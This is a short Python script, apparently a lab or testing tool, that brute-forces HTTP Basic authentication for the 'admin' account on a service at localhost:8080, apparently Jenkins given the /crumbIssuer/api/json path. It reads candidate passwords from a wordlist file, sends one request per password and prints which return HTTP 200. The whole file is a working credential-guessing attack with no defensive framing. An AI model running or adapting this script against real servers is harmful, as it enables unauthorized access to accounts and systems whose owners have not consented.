import urllib.request
import base64

with open('unix_passwords.txt', 'r') as passwords:
    # headers = {'Authorization': base64.b64encode(str.encode('admin:' + 'asd'))}
    # print(headers)
    for password in passwords:
        password = password.replace('\n', '')
        url = 'http://localhost:8080/crumbIssuer/api/json'
        request = urllib.request.Request(url)
        request.add_header('Authorization', 'Basic ' + base64.b64encode(str.encode('admin:' + password)).decode('utf-8'))
        print(request)
        try: 
            urllib.request.urlopen(request)
            print(password + ': 200')
        except urllib.error.HTTPError as e:
            print(password + ': ' + str(e.code) + '\n')

        